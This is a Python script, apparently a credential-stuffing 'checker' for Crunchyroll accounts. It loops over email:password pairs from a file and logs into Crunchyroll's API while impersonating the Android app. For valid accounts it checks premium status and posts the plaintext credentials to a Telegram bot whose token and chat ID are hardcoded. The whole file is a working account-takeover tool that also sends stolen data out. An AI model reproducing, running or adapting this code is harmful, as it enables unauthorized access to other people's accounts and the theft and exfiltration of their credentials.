import requests
import random
import os
import pyfiglet
import time
from user_agent import generate_user_agent
from colorama import Fore, Style, init

# Initialize colorama
init()

# Colors
GREY = Fore.LIGHTBLACK_EX  # Light grey
RED = Fore.RED  # Red
GREEN = Fore.GREEN  # Green
BLUE = Fore.BLUE  # Blue
RESET = Style.RESET_ALL

device_id = ''.join(random.choice('0123456789abcdef') for _ in range(32))

# Print single banner
def print_banner(title):
    os.system('clear')
    
    # D-TECH custom banner
    d_tech_banner = pyfiglet.figlet_format("D-TECH", font="slant")
    
    # Display banner with symbols and styles
    print(f"{RED}╔═══════════════════════════════════════════════════════════════════╗{RESET}")
    print(f"{GREY}{d_tech_banner}{RESET}")
    print(f"{GREEN}                        Reconfigured by preasx24@gmail.com{RESET}")
    print(f"{RED}╚═══════════════════════════════════════════════════════════════════╝{RESET}")
    print(f"{GREEN}{' '*30}>> Github: Preasx24 <<{' '*30}{RESET}\n")
    print(f"{GREEN}{'━'*67}{RESET}")

# Display futuristic animation
def futuristic_animation():
    for _ in range(20):
        os.system('clear')
        d_tech = pyfiglet.figlet_format("D-TECH", font=random.choice(["slant", "banner", "digital"]))
        color = random.choice([GREEN, RED, BLUE, GREY])
        print(f"{color}{d_tech}{RESET}")
        time.sleep(0.1)
        
    print(f"{GREEN}\n{'='*30} SYSTEM SCAN COMPLETE {'='*30}\n{RESET}")
    time.sleep(2)

print_banner('Crunchyroll')

ID = '-4592722421'

file_name = 'accounts.txt'
print(f"{GREEN}{'━'*67}{RESET}")
file = open(file_name).read().splitlines()

successful_attempts = []

telegram_bot_token = '7331594564:AAEXXu9NqWM2M8wQ1KMzVdl5V61yJCucbW0'
telegram_chat_id = ID

for xx in file:
    if ":" in xx:
        email = xx.split(':')[0]
        pasw = xx.split(':')[1]

        # Step 1: Authenticate and get access token
        auth_url = "https://beta-api.crunchyroll.com/auth/v1/token"
        headers = {
            "host": "beta-api.crunchyroll.com",
            "authorization": "Basic d2piMV90YThta3Y3X2t4aHF6djc6MnlSWlg0Y0psX28yMzRqa2FNaXRTbXNLUVlGaUpQXzU=",
            "content-type": "application/x-www-form-urlencoded",
            "accept-encoding": "gzip",
            "user-agent": "Crunchyroll/3.59.0 Android/14 okhttp/4.12.0"
        }

        data = {
            "username": email,
            "password": pasw,
            "grant_type": "password",
            "scope": "offline_access",
            "device_id": device_id,
            "device_name": "SM-G9810",
            "device_type": "samsung SM-G955N"
        }

        res = requests.post(auth_url, data=data, headers=headers)

        if "refresh_token" in res.text:
            print(f'{GREEN} [ GOOD ] ☑  >>>> [ {email} | {pasw} ]{RESET}')
            successful_attempts.append(f"{email}:{pasw}")

            access_token = res.json().get("access_token")

            # Step 2: Get external_id
            account_url = "https://beta-api.crunchyroll.com/accounts/v1/me"
            account_headers = {
                "Authorization": f"Bearer {access_token}",
                "User-Agent": generate_user_agent()
            }

            account_res = requests.get(account_url, headers=account_headers)
            if account_res.status_code == 200:
                external_id = account_res.json().get("external_id")

                # Step 3: Check subscription status
                subs_url = f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/products"
                subs_res = requests.get(subs_url, headers=account_headers)

                if subs_res.status_code == 200 and subs_res.json().get("total", 0) > 0:
                    account_status = f'[ WOW PREMIUM ACCOUNT ] 🌟'
                else:
                    account_status = f'[ FREE TRIAL ACCOUNT ] ❌'

                # Format the message as a "table"
                telegram_message = f'**Account Status**: {account_status}\n\n'
                telegram_message += f'```\n'
                telegram_message += f'Email                | Password\n'
                telegram_message += f'---------------------|---------------------\n'
                telegram_message += f'{email:<20} | {pasw:<20}\n'
                telegram_message += f'```'

                # Send result to Telegram bot immediately
                telegram_url = f'https://api.telegram.org/bot{telegram_bot_token}/sendMessage?chat_id={telegram_chat_id}&parse_mode=Markdown&text={telegram_message}'
                requests.post(telegram_url)
            else:
                print(f"{RED} [ ERROR ] Unable to get external ID for {email}{RESET}")
        else:
            print(f'{RED} [ ERROR ] ❌ >>>> [ {email} | {pasw} ]{RESET}')
            time.sleep(6)

# Run the futuristic animation before showing the successful attempts
futuristic_animation()

# After the animation, display all successful attempts
if successful_attempts:
    print(f"{GREEN}{'━'*67}{RESET}")
    print(f"{BLUE}    ✨✨ Successful Attempts: ✨✨{RESET}")
    for attempt in successful_attempts:
        print(f"{GREEN} ➤ {attempt} {RESET}")
    print(f"{GREEN}{'━'*67}{RESET}")
else:
    print(f"{RED} No successful attempts found. {RESET}")
